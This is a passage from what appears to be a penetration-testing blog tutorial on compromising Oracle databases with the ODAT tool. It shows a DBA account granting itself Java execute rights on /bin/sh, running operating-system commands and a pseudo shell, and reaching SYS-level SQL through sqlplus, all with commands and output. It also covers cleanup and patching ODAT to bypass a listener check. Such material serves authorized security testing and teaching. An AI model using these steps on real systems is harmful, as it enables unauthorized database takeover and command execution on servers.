10:32:01 INFO -: Delete the java class compiled
```

We see the error `the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not been granted to CUS...`, which means we don't have execute permission over `/bin/sh`. So while the `java` library is widely available to database users in my experience, being able to actually self grant this permission is reserved for high-privilege Java users.

Let's go ahead and give ourselves this permission:

```sql
[2025-11-27 04:35:06] CUSTOM_DBA> BEGIN
                                      dbms_java.grant_permission(
                                      'CUSTOM_DBA', 'SYS:java.io.FilePermission', '/bin/sh', 'execute'
                                      );
                                  end;
[2025-11-27 04:35:06] completed in 207 ms
```

Now we can try again:

```bash
python3 odat.py java -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --exec /usr/bin/whoami  
10:35:55 INFO -: CX_Oracle is well configured according to parameters  
10:35:55 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Execute the `/usr/bin/whoami` on the 192.168.187.135 server  
10:35:55 INFO -: Create and compile the java class  
10:35:56 INFO -: Create a function to call java  
10:35:56 INFO -: Execute the following command system remotly: /usr/bin/whoami  
10:35:56 INFO -: The system command output is: `oracle  
`...  
oracle  
  
10:35:56 INFO -: Delete the PL/SQL function created  
10:35:56 INFO -: Delete the java class compiled
```

This is now working, and we can see that we are running as the `oracle` user. We can now launch a pseudo shell and use that.

>Note that in this pseudo shell, you must escape single quotes (`'`) as they are being interpreted by the Java execution. You can end up with some pretty complex escaping in this pseudo shell, so I would recommend getting an implant on the box for more post-exploitation activities.

```bash
python3 odat.py java -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --shell  
10:38:45 INFO -: CX_Oracle is well configured according to parameters  
10:38:45 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Try to give you a pseudo shell to the 192.168.187.135 server  
10:38:45 INFO -: Create and compile the java class  
10:38:45 INFO -: Create a function to call java  
192.168.187.135$ /bin/id  
10:38:48 INFO -: Execute the following command system remotly: /bin/id  
10:38:48 INFO -: The system command output is: `uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:in`...  
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0

192.168.187.135$ /bin/cat /etc/os-release  
10:39:35 INFO -: Execute the following command system remotly: /bin/cat /etc/os-release  
10:39:35 INFO -: The system command output is: `NAME="Oracle Linux Server"  
VERSION="7.9"  
ID="ol"  
ID_LIKE="fedora"  
VARIANT="Server"  
VARIANT_ID="serve`...  
NAME="Oracle Linux Server"  
VERSION="7.9"  
ID="ol"  
ID_LIKE="fedora"  
VARIANT="Server"  
VARIANT_ID="server"  
VERSION_ID="7.9"  
PRETTY_NAME="Oracle Linux Server 7.9"  
ANSI_COLOR="0;31"  
CPE_NAME="cpe:/o:oracle:linux:7:9:server"  
HOME_URL="https://linux.oracle.com/"  
BUG_REPORT_URL="https://bugzilla.oracle.com/"  
  
ORACLE_BUGZILLA_PRODUCT="Oracle Linux 7"  
ORACLE_BUGZILLA_PRODUCT_VERSION=7.9  
ORACLE_SUPPORT_PRODUCT="Oracle Linux"  
ORACLE_SUPPORT_PRODUCT_VERSION=7.9  
  
192.168.187.135$
```

At this point you have achieved full database compromise, as you once again can run SQL as the `SYS` user even without knowing their password. We need to format our SQL, and we can use `printf` for that, which we can pipe straight to `sqlplus`. Remember to set the `ORACLE_HOME` path as well.  An example command could look like the following:

```bash
192.168.187.135$ /usr/bin/printf "SET PAGESIZE 50000 FEEDBACK ON LINESIZE 32767 TRIMSPOOL ON COLSEP ''|''\nSELECT USER FROM DUAL;\nEXIT\n" | ORACLE_HOME=/u01/install/APPS/19.0.0 /u01/install/APPS/19.0.0/bin/sqlplus -S / as sysdba  
  
USER  
--------------------------------------------------------------------------------------------------------------------------------  
SYS  
  
1 row selected.
```

#### Cleaning Up
To return our users to the way they were prior to our exploitation with Java, we can simply revoke the permissions we granted. First we query for java permissions given to our account (need to be a DBA):

![Clean Up](../images/oracle-databases4.png)

We can get the `SEQ` number which in our case is `502` for the following commands to disable, then delete our created permission:

```sql
[2025-11-27 04:50:13] CUSTOM_DBA> BEGIN
                                      dbms_java.disable_permission(502);
                                      dbms_java.delete_permission(502);
                                  END;
[2025-11-27 04:50:13] completed in 43 ms
```

Annnnnnd voilà, back to where we began on these.

# Conclusion
Oracle databases are high-value targets on internal networks. When you compromise one, you often gain access to sensitive business data and potential lateral movement opportunities. The techniques covered here, from basic authentication attacks to remote command execution, represent the core attack paths of what you'll encounter during Oracle database assessments.

Remember to always test responsibly within your scope, document everything for your reports, and clean up after yourself. Each environment is different, so adapt these techniques as needed for your specific target.

# Extras

## Troubleshooting
### TNS Listener "Not Well Configured" Error
If you encounter an error similar to the one below, the TNS listener can usually still be connected to despite the warning:
```
According to a test, the TNS listener <HOST>:<PORT> is NOT well configured. This target is SKIPPED
```

Depending on your target environment, you may not be able to connect to the TNS listener with ODAT out of the box. I've encountered this in specific environments, and you can typically bypass it by disabling the check. Edit the `odat.py` file and locate line 156 inside the `checkIfWorkingTnsListener()` function. Replace `statusWorking = odb.isWorkingTnsListener()` with `statusWorking = True`. This override will get you past the error. If it still fails after connecting, something else may be wrong.

```python
def checkIfWorkingTnsListener(args, timeoutTCP=10):
	'''
	Returns True if it is a working TNS listener. Otherwise False
	Use server and port of args only for testing.
	'''
	args['print'].printMessage("Checking if target {0}:{1} is well configured for a connection...".format(args['server'], args['port']))
	socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socks.settimeout(timeoutTCP)
	logging.debug('Trying a TCP connection to {0} port {1}'.format(args['server'], args['port']))
	try:
		socks.connect((args['server'], int(args['port'])))
		logging.debug("Connection established to server")
	except Exception as e:
		args['print'].badNews("Impossible to establish a TCP connection to {0}:{1}. This target is SKIPPED".format(args['server'], args['port']))
		logging.debug("TCP error: {0}".format(str(e)))
		return False
	socks.close()
	odb = OracleDatabase(args)
    # Switch the `statusWorking` variable below to True:
	statusWorking = odb.isWorkingTnsListener()  # -> True
	if statusWorking == False:
		args['print'].badNews("According to a test, the TNS listener {0}:{1} is NOT well configured. This target is SKIPPED".format(args['server'], args['port']))
		return False
	else:
		args['print'].goodNews("According to a test, the TNS listener {0}:{1} is well configured. Continue...".format(args['server'],args['port']))
		return True
```

The `odb.isWorkingTnsListener()` function works by sending junk connection data (random SID, username, and password). If a specific error code (`ORA-12505`) appears in the response, it returns `True`. In some hardened environments—presumably to prevent SID enumeration—this specific error is suppressed. In these cases, you'll need to discover the `SID` or `Service Name` by running other ODAT commands and confirming when they successfully connect.

```python
def isWorkingTnsListener(self):
    '''
    Returns True when the TNS listener is well configured and it can be used for connection. Otherwise, return False
    Sends a connection with an invalid login, password and SID. If TNS listener is working, the TNS listener
    should returns an error with the SID. Ib this case, the TNS listener is working. Otherwise, TNS does not work well.
    '''
    workingTNS = False
    lastServiceName = self.args['serviceName']
    self.args['serviceName'] = None
    lastSID = self.args['sid']
    self.args['sid'] = self.__generateRandomString__(nb=12)
    self.__generateConnectionString__(username=self.__generateRandomString__(nb=15),
                                        password=self.__generateRandomString__(nb=5))
    logging.debug("Checking if {0}:{1} is a working TNS listener...".format(self.args['server'], self.args['port']))
    status = self.connection(stopIfError=False)
    #We have an error, because SID is not valid
    if 'ORA-12505' in str(status):
        logging.debug("{0}:{1} is a working TNS listener according to error".format(self.args['server'], self.args['port']))
        workingTNS = True
    else:
        logging.debug("{0}:{1} is NOT a working TNS listener according to error : {2}".format(self.args['server'], self.args['port'], str(status)))
    self.close()
    self.args['sid']         = lastSID
    self.args['serviceName'] = lastServiceName
    return workingTNS
```

## References
- ODAT and the ODAT Wiki: https://github.com/quentinhardy/odat and https://github.com/quentinhardy/odat/wiki
- Pyenv quick start: https://www.kali.org/docs/general-use/using-eol-python-versions/
- Oracle Docs: https://docs.oracle.com
- Article on cracking Oracle password files: https://laurent-leturgez.com/2017/12/15/brute-forcing-the-oracle-password-file/
- Hashcat Example Hashes: https://hashcat.net/wiki/doku.php?id=example_hashes


---

*P.S. - If you are still reading this and are a real human, I appreciate you taking the time to visit and read my blog.*